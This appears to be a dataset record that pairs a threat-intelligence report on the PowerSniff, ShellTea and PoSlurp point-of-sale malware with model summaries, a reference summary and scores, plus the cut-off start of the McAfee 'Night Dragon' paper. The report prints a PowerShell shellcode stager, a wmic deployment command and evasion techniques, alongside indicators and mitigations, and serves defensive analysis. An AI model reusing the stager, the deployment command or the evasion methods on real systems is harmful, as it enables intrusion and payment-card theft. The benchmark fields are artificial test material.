other even more harmful motives of today\u2019s criminal elements. To the businesses targeted by cyber criminals, the negative effects are far reaching with impact on brand reputation, consumer and investor confidence, and business growth strategies. With such a lucrative target as payment card data, adversary groups continue to adapt Tactics, Techniques, and Procedures (TTPs) in response to defenders\u2019 change in security practices. One effective attacker TTP is to use so-called \u201cfileless,\u201d or memory-resident malware, to carry out attacks against retailer PoS systems.root9B discovered an advanced, targeted PoS intrusion focused on harvesting payment card information for exfiltration. The adversary\u2019s campaign has active and operational Command and Control (C2) servers. root9B\u2019s analysis determined that the adversary is using advanced memory-resident techniques to maintain persistence and avoid detection. The malware likely required a significant amount of time and knowledge to create. We typically see techniques at this level by well-resourced, well-funded, motivated adversaries.This ongoing campaign has targeted numerous organizations and their PoS systems. root9B uncovered the TTPs utilized and describes them in a detailed analysis below. At a high-level, the adversary\u2019s methodology consists of the following steps:\u2022 Step 1: Reconnaissance and targeting of a corporate individual with a spearphishing email attackemploying an ActiveMIME document with an MS Office-enabled macro.\u2022 Step 2: Email recipient opens the ActiveMIME document attachment and clicks to enable content,executing a PowerShell command initiating a surreptitious shellcode download.\u2022 Step 3: A shellcode blob encapsulating a Dynamic Link Library (DLL) malware is dropped in the system registry and loaded into memory, conducting basic enumeration and sandbox detection on the target. This malware appears to be an updated version of \u201cPowerSniff.\u201d\u2022 Step 4: The malware continues reconnaissance of the target environment and contacts one of its five C2 domains with the results. If the environment meets the conditions the attacker is looking for, the attacker sends additional instructions.\u2022 Step 5: The attackers install a second fileless implant in another registry shellcode blob. This implant, which we have named ShellTea, has not been previously observed or reported. We have identified six hardcoded C2 domains utilized by this implant.\u2022 Step 6: The attacker explores the network using compromised privileged credentials and establishes persistent staging servers for deploying malware and collecting data from PoS endpoints. Several staging servers are utilized by the attackers to spread the workload and provide redundancy to thwart defensive measures.3\u2022 Step 7: An advanced PoS RAM scraping malware, we have named PoSlurp, is deployed to the PoS endpoints. PoSlurp directly injects memory-resident code into a privileged user mode process. This capability has not been previously reported. The attacker can specify which PoS processes should be monitored for payment card transactions.root9B has been able to deconstruct the four major components of the adversary\u2019s activities. Provided here is a detailed analysis of the initial access method, command-and-control methods, and the new ShellTea implant and PoSlurp POS RAM Scraper.ATTACK OVERVIEWINITIAL ACCESSInitial execution of the attack begins with a customized email to a targeted entity with a malicious macro- enabled ActiveMime Office document attached. Once the targeted victim opens the attached document and clicks to enable macros, the macro quietly launches a PowerShell command that will download another PowerShell stage from a staging site (often public paste sites) into memory and execute it. Seen in the command line below is the command (iex) to execute the downloaded payload in memory, after determining if a 32-bit or 64-bit payload is required ([IntPtr]::size -eq 4). This technique maintains a fileless footprint on the target.4POWERSNIFF DROPPERThe previous PowerShell script will in turn load and execute a 32-bit or 64-bit binary shellcode blob in memory. The returned shellcode blob includes code to then de-obfuscate and load a DLL into memory. It also includes a function hash resolution routine to find API calls it needs that were likely copied from the Carberp source code. Carberp was a common piece of malware that served as a full-featured backdoor, often incorporating additional payloads with the following features:\u2022 Steal browser credentials to banking and other websites\u2022 Steal credentials from other applications\u2022 Monitor users\u2019 keystrokes and screensThis malware does not have any of those capabilities, as it only incorporated the function hashing code from Carberp. The source code to the Carberp banking trojan was leaked a few years ago and is presumably used by several actors now.Once loaded, the inner DLL includes routines to inject itself into the memory of explorer.exe.The malicious Office macro and second-stage payload, downloaded and executed in-memory, matches previous analysis of \"PowerSniff1\" by the following characteristics:\u2022 Use of WMI in the macro to launch the initial PowerShell command\u2022 PowerShell command's method of detecting CPU architecture(by the size of IntPtr, 8 bytes for 64-bit and 4 bytes for 32-bit)\u2022 URL pattern\u2022 Sandbox detection methods\u2022 Basic enumeration command strings in memory, like:cmd /C \"net.exe view > %s\"cmd\t/C\t\"ipconfig\t-all\t>\t%s\"After being loaded and de-obfuscating itself in memory, the logic of this threat bears a strong resemblance to what researchers have called TROJ_RECOLOAD.A , sharing those characteristics as well as the injection into explorer.exe. Through preliminary analysis, we believe that TROJ_RECOLOAD.A2 could also be a variant of Powersniff. Although, in that analysis, they observed it being launched from an exploit kit.1url 2url did detect several differences in the variant we saw. First, the sandbox detection has been overhauled:Sandbox detection in the new PowerSniff variantOur sample, despite retaining the sandbox DLL strings in memory, no longer references most of them in code as it only looks for two. It maintains the same username checks, and our sample has added instructions for detecting sandboxes via several new methods:\u2022 Computing a checksum of the hard disk volume name and checking against a known checksum.\u2022 Looking for strings indicative of virtual machines in the system firmware information.\u2022 Hashing the names of running processes and comparing each against a list of the name hashes ofknown analysis, monitoring, or reverse engineering software.6Interestingly, in this function, it appears the malware developers made a mistake. There are only 25 CRC32s to check against in the array, but the loop comparing the process name CRC32 to the list of hashes runs 100 times, reading off the end of the array and into other data. Most likely this is a result of the malware developers writing a loop in C/C++ as:for(int\ti\t=\t0;\ti\t<\tsizeof(hashes);\ti++){ hashes[i] instead of:for(int\ti\t=\t0;\ti\t<\tsizeof(hashes)\t/\tsizeof(DWORD);\ti++){ hashes[i] running the loop once for each byte in the hash array instead of once for each hash (each hash takes 4 bytes). This mistake likely was not noticed by the developers since this array is not at the end of an allocation, meaning no crash occurs.The adversaries improved and re-implemented these techniques, although they reproduced the same bug, in the ShellTea malware explored in-depth below.In previously reported samples, the malware would download a DLL to disk as .db file and inject the code into memory. Our sample included not only the ability to write a DLL to %%userprofile%%\\AppData\\LocalLow\\%u. db and run it via rundll32, but also to write an executable and run it, or to write a DLL and load it directly into the calling process with LoadLibraryW, depending on the instructions provided by the C2 server. This malware performs HTTP requests with a user-agent created with the following format string: \u201cMozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\u201dAdditionally, we observed functionality, if instructed by the server, to write a DLL and add it to the \"HKLM\\ System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" registry key. This is an unusual persistence method that can also be used as an AppLocker bypass. Each DLL in AppCertDlls will be loaded by the OS into a process whenever a new process is created.7Memory strings from the new PowerSniff variantAnother difference in this variant, is that the strings checked to avoid targeting hospitals and schools have now been removed. This implies the actors behind this intrusion are either: 1.) willing to target healthcare and educational institutions; or 2.) confident their targeted delivery mechanisms make these checks unnecessary.We also observed new C2 servers (see the IOCs section for details.)The PowerSniff sample we analyzed, also inserted the string koollondon/ into the URL path used to contact its C2 servers. Koollondon (url is a radio station in London, England.After the initial PowerSniff intrusion, we observed the threat actors deploy ShellTea, a newly identified piece of memory-resident malware for persistent access, and PoSlurp, a newly identified PoS malware.8SHELLTEA MEMORY RESIDENT MALWARE (C2)Immediately following execution of PowerSniff (and a reboot), we discovered a set of suspicious registry values being launched in a registry key under HKCU\\Software, one of which is reproduced below. This registry value held a PowerShell command that was loaded and invoked in memory by a separate PowerShell launcher. We have reproduced the registry command below, sanitized and formatted slightly for clarity. It acts as a stager to load and execute a shellcode-style implant into memory. It does so by first loading up a binary registry value under the same key with Get-ItemProperty into variable $s.$s=(Get-ItemProperty\t-Path\tHKCU:Software\\Random_Generated_RegistryName \u2013Name\tRandom_KeyName).Random_KeyName_; $l=$s.Length;Next it uses Add-Type to enable the PowerShell script to directly call the Win32 functions VirtualAlloc, CreateThread, and WaitForSingleObject:$c=\"[DllImport(`\"user32.dll`\")]`npublic\tstatic\textern\tInt32 IsChild(Int32\ta,Int32\tb);`n[DllImport(`\"kernel32.dll`\")]`npublic static\textern\tInt32 GetCurrentProcessId();`n[DllImport(`\"kernel32.dll`\")]`npublic\tstatic extern\tIntPtr\tCreateThread(IntPtr\ta,uint\tb,IntPtr\tc,IntPtr\td,uint e,IntPtr\tf);`n[DllImport(`\"kernel32.dll`\")]`npublic\tstatic\textern UInt32\tWaitForSingleObject(IntPtr\ta,\tUInt32 b);`n[DllImport(`\"kernel32.dll`\")]`npublic\tstatic\textern\tIntPtr VirtualAlloc(IntPtr\ta,uint\tb,uint\tc,uint\td);\"; $a=Add-Type\t-memberDefinition\t$c\t-Name\t'Win32'\t-namespace Win32Functions\t-passthru;Internally, Add-Type dynamically creates a .cs file (C# source code) in the user\u2019s temp directory including the declarations from the PowerShell string, runs csc.exe to compile that file into a DLL, loads the DLL from the temporary directory, then deletes the intermediate files. This automatically created DLL is built from the source code in the $c variable. It simply serves as a thin wrapper to allow PowerShell, which can normally only directly call .NET class and object methods, to call the three given Win32 functions. It has no additional logic in it specific to this malware and is not used again after the script calls those three functions. We mention it since the dynamic creation and loading of DLLs from temporary directories is detectable with appropriate monitoring software.After enabling access to these functions by loading the new type, the script calls VirtualAlloc to allocate a section of memory that is readable, writable, and executable. It then copies the contents of the binary registry value into the new section of memory, creates a thread to start executing the loaded implant in memory, and finally waits up to 5 seconds for the thread to complete.9$b=$a::VirtualAlloc(0,$l,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($s,0,$b,$l); $b=$a::CreateThread(0,0,$b,0,0,0); $b=$a::WaitForSingleObject($b,5000))The binary, which is never saved to a file, is the body of the memory-resident implant. It is composed of 64- bit code and data. At the start are two instructions to call 1024 bytes into the shellcode blob, followed by configuration data. The shellcode then calculates its own address by reading it off the stack after it had been saved by the call instruction. This is a trick common to 32-bit shellcode and seems to show the author was more familiar with writing 32-bit shellcode. This trick is not necessary in 64-bit as 64-bit shellcode can directly read its own address or calculate an offset of it.The start of the ShellTea shellcodeAfter obtaining its own address in memory, the shellcode processes a series of relocations. It calculates the difference between its current location in memory and its original base address (0x690000 in our sample). It then updates each of the relocations in memory, just like a normal executable loader. This process also performs some de-obfuscations on the binary. After this point, we can dump memory and begin to disassemble the code.The loader progresses to use a custom function resolver with a simple string hash algorithm that handles loading the required DLLs and resolving their imported functions. However, the binary has very few imported functions. Throughout the code, nearly every API call dynamically resolves a function, again re-using this custom resolver and a 4-byte hash. We believe this is a previously unknown API hashing algorithm, as it did not match10other public API hashing algorithms3 or others we have encountered. We did not find any other public use of some of the constants used in this hashing algorithm, such as 0x463283F5. The API hashing algorithm makes use of a standard linear congruential random number generator (multiplier 0x19660, increment 0x3C6EF35F.)ShellTea API hashing algorithmWe created a custom script to automatically map each of those function hashes to the corresponding API function before continuing analysis. First, we exported the disassembly of the entire implant and grepped for the function hash constants, saving those in one file. Second, we embedded the shellcode and function hashes into a small C++ resolver program. This program called the hash-resolution function on each of the hashes, then used the Debug Help API to find out the names of the API functions that had been resolved. This same method can enable malware reverse engineers to resolve all hashed functions in a sample without stepping through each resolution in the original malware (which is a time-consuming and manual process) or recreating the function hashing algorithm. A link to this Function Hash Resolution tool can be found in the Tools section.3url hashing analysis harnessThird, we pasted the output of the resolver program into a small IDA Python script (in Tools) to apply all the function resolutions to the analysis of the binary.IDA script to apply function resolutions12The binary then adds a custom vectored exception handler to catch any crashes from within its own code and to continue execution safely if possible.The sample decrypts its own callback domains from its configuration block, which is also in the binary with the rest of the code. In our case, we list the six domains observed in the IOC section.The implant also attempts to read and decrypt C2 information from a different registry key, if present, in addition to the built-in domains. The registry key is derived with CRC32 from various system-specific data sources. It then connects over port 443 using a custom binary protocol. It queries proxy configuration from the registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings) and can communicate through proxies via the CONNECT method as well. The implant\u2019s protocol uses the XTEA encryption algorithm in CBC mode.The implant developers have a distinct preference for using low-level native API functions, presumably to avoid detection by standard analysis and HIPS tools. They also make extensive use of CRC32 by calling the undocumented RtlComputeCrc32 function. This function is uncommon, but was used most prominently by the ZeroAccess rootkit4 and the Andromeda malware5, although neither in the same manner as is found in our sample.For example, the implant applies CRC32 to the computer and username and XORs with the SID subauthority values taken directly from the SID structure to assemble a mutex name. It uniquely identifies an implant and prevents duplicate infection against the same host under the same user account. This is likely done to differentiate hosts for tasking.Excerpt from ShellTea\u2019s mutex name derivation4url 5url implant injects its code into explorer.exe. First, it finds the process ID. Second, it uses the low-level RtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject into nearly any process. Third, it opens the process, allocates memory in the process, copies its code into the allocated space, and uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing its code. It then completes the process injection. It can find explorer by finding the process ID owning the shell's desktop window by comparing process names or by using GetShellWindow. This is a function to return a handle to the Windows desktop which would be owned by explorer.exe.In addition to the API obfuscation, the implant uses extensive string obfuscation. It creates most strings on the stack directly before use, character by character, by adding and subtracting various values from a fixed start byte. Fortunately, a good decompiler will see through these. Below is a before-and-after comparison of the code that creates the format string used for the implant\u2019s mutex:ShellTea mutex format string14The implant is built in a modular manner and implements several capabilities. The command dispatcher is shown below:ShellTea command dispatcherIt has built-in routines to:\u2022 Drop an executable in a temporary directory, run it, and queue it for deletion at next reboot. It does so by using the Windows MoveFileEx API with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Internally, this API writes to the PendingFileRenameOperations value of the registry key HKLM\\SYSTEM\\ CurrentControlSet\\Control\\Session Manager.\u2022 Drop a DLL in a temporary directory and to load it, queuing it for deletion at next reboot via thesame mechanism.\u2022 Load an extension DLL directly into memory. It includes a separate routine that will finish mapping theDLL into memory and link up its imports without touching disk.\u2022 Run an operator-provided PowerShell command and receive results back.\u2022 Run raw shellcode directly in memory.\u2022 Install persistence by writing to the current user\u2019s Run key in the registry.15The implant implements sandbox and analysis detection with numerous techniques reminiscent of the analyzed PowerSniff variant. It has improvements in algorithms used, number of analysis processes detected, and employs the just-in-time API function hash resolution:\u2022 Querying the SystemFirmwareTableInformation from the system and looking for common hypervisors.\u2022 Obtaining the name of the system volume, hashing it, and comparing to a known hypervisor hash. Inthis case, in contrast with our PowerSniff variant, ShellTea uses SHA1 as a hashing algorithm.\u2022 Enumerating processes with a low-level API (querying SystemProcessInformation), computing a CRC32 checksum of the upper-cased version of process names and comparing against a table of known monitoring or analysis processes. This includes the default process names of Process Monitor, Wireshark, and IDA. Again, this uses a new checksum algorithm.ShellTea\u2019s process name CRC32 comparison16Once again, as in the PowerSniff variant, it appears the malware developers made the same mistake. There are now 27 CRC32s to check against in the array, but the loop comparing the process name CRC32 to the list of hashes runs 108 times. It reads off the end of the array and into other data. This is most likely because the malware developers wrote a loop that runs once for each byte in the checksum array instead of once for each checksum (each checksum takes 4 bytes.)When the malware exits, it cleans itself up from memory using a clever technique. The exit function replaces its own return address with the address of RtlExitUserThread, then sets up the arguments for the VirtualFree function to free its own code and jumps directly to VirtualFree. This function deallocates all the binary\u2019s memory. Then, when the Windows API function returns, rather than returning to the implant code (which no longer exists in memory), it returns directly to the RtlExitUserThread function. This kills the thread and cleans up nearly all traces of the malware from the injected process.At this point, the adversaries have a foothold which they can use to explore the network environment further. root9B observed the use of common lateral movement techniques, such as dumping passwords, password hashes, and Kerberos tickets with tools like mimikatz or similar. We also observed the adversaries stealing tokens, then using those credentials or creating forged Kerberos tickets (\u201cGolden Tickets\u201d) to maneuver laterally and gain access to network servers on the PoS network which would become the staging points for the remainder of the attack.After obtaining the appropriate access to a server, they use that server to conduct basic network discovery to locate PoS endpoints and create target lists stored in flat text files. Then they have been observed to launch shell commands, including wmic.exe, to push the PoS software, which we dubbed PoSlurp, to the PoS machines to launch it. Upon successful collection and exfil of payment card data using PoSlurp, the adversaries then clean-up after themselves to eliminate on-disk artifacts.POSLURP MALWAREPoSlurp is a highly-obfuscated malicious RAM scraper that gets remotely deployed to PoS systems and can be launched via local or remote commands.The file can be launched in any number of ways, but root9B observed it with both local and remote execution with command-line arguments matching the following pattern:Local Execution:[PoSlurp_filename].exe\tTARGET1.EXE#TARGET2.exe*1234*winlogon.exeRemote Execution:This command uses the file targets.txt as target list to direct the execution of PoSlurp to specific PoS end-points.17wmic /node:\"@targets.txt\"\tprocess\tcall\tcreate\t\"cmd\t/c\t[PoSlurp_filename].exe TARGET1.EXE#TARGET2.exe*1234*winlogon.exe\"The target executable names in the arguments refer to specific processes relating to PoS payment/routing software. The number in the middle is how many minutes (1234) to run the RAM scraper, while the last filename in the command line (winlogon.exe) refers to the process to inject the inner PoSlurp malware into. As far as we can tell, PoSlurp should be able to inject itself into any user mode process.PoSlurp has an extensive amount of obfuscation to make analysis difficult, such as the use of opaque predicates (functions with no return opcode just a jump or alternative instruction) and multiple steps to load its main code. That said, we did not see sandbox and analysis detection in this sample. PoSlurp uses a three-step approach to load:Step 1: The outer layer or Step 1 of the PoSlurp malware, like the ShellTea backdoor, used a custom function resolver with a simple string hash algorithm that handles loading the required DLLs and resolving the imported functions. This function hashing algorithm, however, was unique and not the same as the ShellTea sample.PoSlurp API hashing18PoSlurp\u2019s Step 1 first calculates one constant by resolving the address of RtlWriteMemoryStream via function hash 0x22F3608C, then reads the second byte of that function, which is always 1, to calculate its second function hash. Since its introduction into Windows, RtlWriteMemoryStream has remained unimplemented as a function. It simply returns an error code. This means that the bytes of this function have not changed and can be treated as constants. The novel technique of using this code as a constant ensures that the malware will function reliably, yet fools some automated analysis tools that are not aware of the binary structure of all the external modules.Step 1 then uses the newly calculated hash, 0x1BC4C4FC, to resolve the low-level ZwAllocateVirtualMemory function which it calls to allocate executable and writable memory to extract its second step to. After decoding and copying the payload to the newly obtained memory, it starts executing the second step code. In our case, the second step was 6610 bytes long.Step 2 This code has its own resolution-by-hash function, a copy of the Carberp function hashing algorithm. Like PowerSniff, PoSlurp only incorporated the function hashing code from Carberp. One of the first functions to be resolved uses hash 0x594AA9E4, the function hash of ZwAllocateVirtualMemory in that algorithm. The Carberp-based Step 2 simply loads and links yet another embedded obfuscated binary as a third step, using low-level library loading and function resolution functions like LdrLoadDll and LdrGetProcedureAddress to resolve the third step\u2019s imported functions.Step 3 is an inner DLL that uses minimal obfuscation tricks and contains most of the business logic. Step 3 is not completely unobfuscated, as it does use string obfuscation reminiscent of the ShellTea memory-resident backdoor by assembling strings on the stack one character at a time. It parses the command line of the calling process, extracting out process names to inject into and monitor. It finds those processes using the standard high-level CreateToolhelp32Snapshot and associated API calls, comparing executable names from the data returned.The inner DLL uses similar process injection code to ShellTea as well. First, it finds the process ID. Second, it uses the low-level RtlAdjustPrivilege call with the ID of the SE_DEBUG access right to enable the right to inject into nearly any process. Third, it opens the process, allocates memory in the process, copies its code into the allocated space, and uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing its code. This completes the process injection. After that point, the original process exits.After being injected into the target process, PoSlurp re-links itself, deletes any old output file if present, and launches its RAM scraping functionality. Every 5 seconds until timeout, each data section of the target processes\u2019 memory is identified and scanned for strings indicative of payment card data which are then encrypted and saved.19PoSlurp memory scraping outer loopWhen scanning memory, it efficiently identifies memory sections of interest with VirtualQueryEx, then reads them into newly allocated sections of memory of the same size in its own process to search through their contents.PoSlurp code to search for data memory segments20Payment card data is detected by a series of simple tests which look for properly formatted data, such as strings of digits followed by an equals sign, with both ASCII and wide-char strings. When payment card data is detected, the malware first calculates a hash of the string and checks against a running list of output hashes to ensure it does not output duplicate data, then writes its output to a hidden file in the %TMP% directory. It stores hashes for the last 10,000 strings it has output to use in its duplicate check.Assuming this is a new piece of payment card data and not a duplicate of one already detected, the data is encrypted with a simple XOR-based stream cipher using a randomly-selected 4-byte key. This algorithm is based on a standard linear congruential random number generator with multiplier 0x19660D, but with a different increment value (- 0x49F91E6B) than the most common (0x3C6EF35F, which is also used in the PowerSniff and ShellTea malware.)PoSlurp encryption algorithmEach chunk of the output file starts with a 5-byte header containing the length of the chunk in the first byte followed by the 4-byte key and the encrypted data. Based on this static analysis, we created a decryption script for the data files shown below. #!/usr/bin/ruby #\tRun\tlike\tthis\tin\ta\tconsole:\truby\tdecrypt.rb\t<\tencrypted_data inp\t=\tSTDIN l\t=\tinp.read(1) until\tl.nil? len\t=\tl.unpack('C')[0] key\t=\tinp.read(4).unpack('V')[0] crypted\t=\tinp.read(len).unpack('C*') plain\t=\tcrypted.map\tdo\t|c| p\t=\t(c\t^\tkey)\t&\t0xFF key\t=\t((0x19660D\t*\tkey)\t&\t0xFFFFFFFF)\t-\t0x49F91E6B puts\tplain.pack('C*').inspect l\t=\tinp.read(1) endThis script may aid future incident responders or law enforcement to identify what data has been stolen.21MITIGATION RECOMMENDATIONS\u2022 Apply macro restrictions in your environment to prevent users from inadvertently running malicious Office macros to help address this common initial access vector. For details, see: url microsoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-prevent- infection/.\u2022 Limit the exposure of privileged administrator credentials by following best practices such as the PAW model, audit your credential risks, and require multifactor authentication for privileged users. For details, see: url privileged-access-workstations.\u2022 Implement application whitelisting on PoS systems utilizing Microsoft\u2019s built-in AppLocker or one of many commercial solutions. Much like the previous mitigation recommendation, PoS systems should be highly standardized and have no software running or installed that isn\u2019t part of required functionality. Audit application execution in a development environment to build an effective yet minimal whitelist.\u2022 Develop and maintain a robust security monitoring program or contract an experienced security company. Tune your environment to collect relevant network and endpoint-based artifacts that allow you to detect adversary actions. Focus your analysis on critical network segments and employ active defense methodologies (HUNT) to proactively identify persistent threats.\u2022 Create a whitelist or greylist of domains and IP addresses that your organization is allowed to reachvia the network.\u2022 Implement effective network segmentation controls. Prohibiting communication between distinct segments such as PoS and Store networks, except for required ports and protocols, and using different credentials in each network will greatly delay if not eliminate the attacker\u2019s ability to traverse the networks. Communication between systems in these critical networks should be far more predictable than the corporate network, enabling a security monitoring program to more easily identify abnormal activity.22INDICATORS OF COMPROMISE (IOCS) POWERSNIFF C2 DOMAINSvseflijkoindex.netvortexclothings.bizunkerdubsonics.orgpopskentown.comSHELLTEA C2 DOMAINSneofilgestunin.orgverfgainling.netstraubeoldscles.orgolohvikoend.orgmenoograskilllev.netasojinoviesder.orgTOOLSFunction Hash Resolution Tool, IDA Script, and Process Name CRC32 Code: url ", "generated_text": "analysis; customer point-of-sale; Retail Point-of-Sale; the campaign; fileless; memory-resident malware; attacks; the attackers; a spearphishing email; ActiveMIME; macros; a PowerShell command; a shellcode blob; Dynamic Link Library; DLL; ShellTea; the malware; persistence; the attackers; Initial access; command; Control; persistence; data; persistence; persistence; POSLURP; memory-resident code; the attackers; Network; persistence; the malware.", "ref_text": "<START-1>The document describes a point-of-sale malware campaign targeting retailers. It begins with a phishing email containing macros that download an initial reconnaissance implant. This is followed by deployment of a persistent backdoor called ShellTea and a memory-scraping POS malware called PoSlurp. ShellTea injects into Explorer and uses obfuscation and anti-analysis techniques. PoSlurp directly injects into targeted POS processes to steal payment card data. The report analyzes the technical details of the malware and provides mitigation recommendations focused on restricting macros, limiting exposed credentials, whitelisting, monitoring, and network segmentation. <END-1>", "t5/keyword/hint_hit_precision": 0.21875, "t5/word/hint_hit_recall": 0.09090909090909091, "gpt3/lexical/rouge_rouge1": 0.47290640394088673, "gpt3/lexical/rouge_rouge2": 0.11940298507462686, "gpt3/lexical/rouge_rougeL": 0.2857142857142857, "gpt3/lexical/rouge_rougeLsum": 0.2857142857142857, "gpt3_generated_text": ["The article discusses a campaign targeting customer point-of-sale systems using memory-resident malware. The attackers employ spearphishing emails with malicious macros to gain initial access to the system. This triggers the download of a PowerShell stage into memory, leading to the deployment of advanced malware such as ShellTea and PoSlurp. The attackers establish persistence through registry shellcode blobs and utilize multiple C2 domains for command and control. PoSlurp injects memory-resident code into PoS processes to scrape payment card data. The attackers use compromised credentials to explore the network and deploy malware. The campaign highlights the evolving tactics of financially motivated hackers in targeting Retail Point-of-Sale systems."]}, {"split_name": "val", "sample_id": "val_21", "prompt_text": "Extract the keywords: White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201d By McAfee\u00ae Foundstone\u00ae Professional Services and McAfee Labs\u2122 February 10, 2011334778991111121213131318White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dTable of Contents Executive SummaryAnatomy of a HackDetails of the AttackUse of remote administration toolsDetectionHost Files and Registry KeysAnti-virus AlertsNetwork CommunicationsAdditional Detection TechniquesMcAfee Early DetectionMcAfee DetectionMcAfee PreventionConclusionCredits and AcknowledgementsAppendix A: zwShell \u2014 the RATAppendix B: AttributionVersion 1.4 | Feb 11, 2011 03:30 PMWhite PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dExecutive Summary In 2010, we entered a new decade in the world of cybersecurity. The prior decade was stained with immaturity, reactive technical solutions, and a lack of security sophistication that promoted critical outbreaks, such as Code Red, Nimda, Blaster, Sasser, SQL Slammer, Conficker, and myDoom\u2014to name a few. The security community has evolved and grown smarter about security, safe computing, and system hardening but so have our adversaries. This decade is setting up to be the exponential jumping off point. The adversaries are rapidly leveraging productized malware toolkits that let them develop more malware than in all prior years combined, and they have matured from the prior decade to release the most insidious and persistent cyberthreats ever known.The Google hacks (\u201cOperation Aurora\u201d), named by McAfee and announced in January 2010, and the WikiLeaks document disclosures of 2010 have highlighted the fact that external and internal threats are nearly impossible to prevent. Miscreants continue to infiltrate networks and exfiltrate sensitive and proprietary data upon which the world\u2019s economies depend every day. When a new attack emerges, security vendors cannot stand by idly and watch. We are obligated to share our findings to protect those not yet impacted and to repair those who have been. As such, McAfee Foundstone Professional Services and McAfee Labs decided to release the following discovery.Starting in November 2009, coordinated covert and targeted cyberattacks have been conducted against global oil, energy, and petrochemical companies. These attacks have involved social engineering, spear- phishing attacks, exploitation of Microsoft Windows operating systems vulnerabilities, Microsoft Active Directory compromises, and the use of remote administration tools (RATs) in targeting and harvesting sensitive competitive proprietary operations and project-financing information with regard to oil and gas field bids and operations. We have identified the tools, techniques, and network activities used in these continuing attacks \u2014 which we have dubbed Night Dragon \u2014 as originating primarily in China. Through coordinated analysis of the related events and tools used, McAfee has determined identifying features to assist companies with detection and investigation. While we believe many actors have participated in these attacks, we have been able to identify one individual who has provided the crucial C&C infrastructure to the attackers. (See Appendix B for more detail on attribution.)Anatomy of a HackNIGHTDRAGON12345Extranet webserversGained access to sensitiveinternalcompromiseddesktops andserversAccessed additionalusernames andpasswordsEnabled direct machines to theInternetEx(cid:2)ltrated emailarchives and other sensitivedocumentsGlobal Energy uploaded toserversFurther accessto sensitive computerscompromisedSource: McAfee, Inc. Figure 1. Anatomy of a hack.3White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dThe Night Dragon attacks work by methodical and progressive intrusions into the targeted infrastructure. The following basic activities were performed by the Night Dragon operation:\u2022 Company extranet web servers compromised through SQL-injection techniques, allowing remotecommand execution\u2022 Commonly available hacker tools are uploaded on compromised web servers, allowing attackers to pivot into the company\u2019s intranet and giving them access to sensitive desktops and servers internally\u2022 Using password cracking and pass-the-hash tools, attackers gain additional usernames and passwords,allowing them to obtain further authenticated access to sensitive internal desktops and servers\u2022 Initially using the company\u2019s compromised web servers as command and control (C&C) servers, the attackers discovered that they needed only to disable Microsoft Internet Explorer (IE) proxy settings to allow direct communication from infected machines to the Internet\u2022 Using the RAT malware, they proceeded to connect to other machines (targeting executives)and exfiltrating email archives and other sensitive documentsDetails of the Attack Attackers using several locations in China have leveraged C&C servers on purchased hosted services in the United States and compromised servers in the Netherlands to wage attacks against global oil, gas, and petrochemical companies, as well as individuals and executives in Kazakhstan, Taiwan, Greece, and the United States to acquire proprietary and highly confidential information. The primary operational technique used by the attackers comprised a variety of hacker tools, including privately developed and customized RAT tools that provided complete remote administration capabilities to the attacker. RATs provide functions similar to Citrix or Microsoft Windows Terminal Services, allowing a remote individual to completely control the affected system.To deploy these tools, attackers first compromised perimeter security controls, through SQL-injection exploits of extranet web servers, as well as targeted spear-phishing attacks of mobile worker laptops, and compromising corporate VPN accounts to penetrate the targeted company\u2019s defensive architectures (DMZs and firewalls) and conduct reconnaissance of targeted companies\u2019 networked computers.SQL Injection Attacks(1) Attacker crafts a HTTP GET request to inject commands to SQL server to gain system-level access(2) Malware is placed on server and used to harvest the local and Active Directory account credentialsWebInternetSQLAD(4) Attacker uses RAT malware to conduct additional reconnaissance and systems compromises and to harvest con\u201edential dataC&C(3) Active Directory accounts are used to access network computers and plant RAT malware that connects with remote C&C addresses.Figure 2. SQL-injection attacks.4White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dSpear-Phishing Attacks(2) User opens infected email and the compromised website is accessed; a RAT is downloaded(1) Attacker sends a spear-phishing email containing a link to a compromised web serverWebInternetEmail(4) Attacker uses RAT malware to conduct additional reconnaissance and systems compromises and to harvest con(cid:1)dential dataC&C(3) User account information and host con(cid:1)guration information is sent to a C&C serverFigure 3. Spear-phishing attacks.Many Chinese hacker websites offer these tools for download, including links to reduh, WebShell, ASPXSpy, and many others, plus exploits and zero-day malware.Figure 4. Rootkin.net.cn offers access to an endless list of hacker tools and exploits.5White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dFigure 5. WebShell and ASPXSpy tools allow an attacker to bypass many firewall rules to funnel all control through a company\u2019s web server.6White PaperGlobal Energy Cyberattacks: \u201cNight Dragon\u201dOnce the initial system was compromised, the attackers compromised local administrator accounts and Active Directory administrator (and administrative users) accounts. The attackers often used common Windows utilities, such as SysInternals tools (acquired by Microsoft in 2006) \u2014 and other publicly available software, including hacking tools developed in China and widely available on Chinese underground hacker websites \u2014 to establish \u201cbackdoors\u201d through reverse proxies and planted Trojans that allowed the attackers to bypass network and host security policies and settings. Desktop anti-virus and anti-spyware tools were also disabled in some instances \u2014 a common technique of targeted attacks.Use of remote administration tools Remote administration tools (RATs) are commonly used administrative tools that allow hackers (and administrators) to manage victims\u2019 computers (or managed systems) and completely control their use and function. A commonly used RAT in the hacker community is Gh0st and its many variants. RAT features often include screen and webcam spying, keystroke logging, mouse control, file/registry, and process management, and, of course, remote command shell capability.McAfee has identified several RATs that have been used to establish a persistent infiltration channel into compromised companies. One of the most prevalent RATs is zwShell, which McAfee has seen in the wild since the spring of 2010 (compiled on 2010-03-17 08:47:00). Written in the Delphi language, zwShell was used by attackers to both build custom variants of the Trojan that they deployed on dozens of machines within each victim company, as well as to control compromised machines that would initiate beacon connections to it on a custom protocol.Attackers used zwShell extensively to generate dozens of unique Trojan variants and to control the infected machines and exfiltrate sensitive data directly from them. (See Appendix A for a breakdown of the zwShell.)Once the attackers had complete control of the targeted internal system, they dumped account hashes with gsecdump and used the Cain 